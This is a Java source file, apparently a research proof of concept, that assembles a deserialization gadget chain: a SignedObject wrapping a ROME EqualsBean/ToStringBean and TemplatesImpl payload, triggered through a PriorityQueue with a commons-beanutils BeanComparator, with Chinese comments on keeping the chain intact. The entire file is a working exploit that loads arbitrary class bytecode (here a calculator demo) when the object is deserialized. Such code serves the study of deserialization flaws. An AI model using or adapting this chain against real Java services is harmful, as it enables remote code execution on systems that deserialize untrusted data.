package SignedObject;
import Utils.ReflectUtils;
import Utils.SerialUtils;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.syndication.feed.impl.EqualsBean;
import com.sun.syndication.feed.impl.ToStringBean;
import org.apache.commons.beanutils.BeanComparator;

import javax.xml.transform.Templates;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.Signature;
import java.security.SignedObject;
import java.util.HashMap;
import java.util.PriorityQueue;


public class CB1 {
    public static void main(String[] args) throws Exception{
        HashMap<Object,Object> evilObject = (HashMap<Object, Object>) getEvilObject();

        KeyPairGenerator kpg = KeyPairGenerator.getInstance("DSA");
        kpg.initialize(1024);
        KeyPair kp = kpg.generateKeyPair();
        SignedObject signedObject = new SignedObject(evilObject, kp.getPrivate(), Signature.getInstance("DSA"));

        BeanComparator beanComparator = new BeanComparator();

//        // add会提前触发链条，这里选择先提前add，再统一传参
        PriorityQueue priorityQueue = new PriorityQueue(beanComparator);
        priorityQueue.add(1);
        priorityQueue.add(2);

//      统一传参，防止链条被破坏
        ReflectUtils.setFieldValue(priorityQueue,"queue",new SignedObject[]{signedObject,signedObject});
        ReflectUtils.setFieldValue(beanComparator,"property","object");
//
        SerialUtils.serialize(priorityQueue);
        SerialUtils.unserialize();

    }
    // here can be CC object or others need to deserialize.
    public static Object getEvilObject()throws Exception {
        TemplatesImpl templatesimpl = new TemplatesImpl();
        byte[] bytecodes = Files.readAllBytes(Paths.get("D:\\Calc.class"));
        ReflectUtils.setFieldValue(templatesimpl,"_name","Jasper");
        ReflectUtils.setFieldValue(templatesimpl,"_bytecodes",new byte[][] {bytecodes});

        ToStringBean toStringBean = new ToStringBean(Templates.class,templatesimpl);
        EqualsBean equalsBean = new EqualsBean(ToStringBean.class,toStringBean);

        HashMap<Object,Object> hashMap = new HashMap<>();
        hashMap.put(equalsBean, "123");
        return hashMap;
    }
}
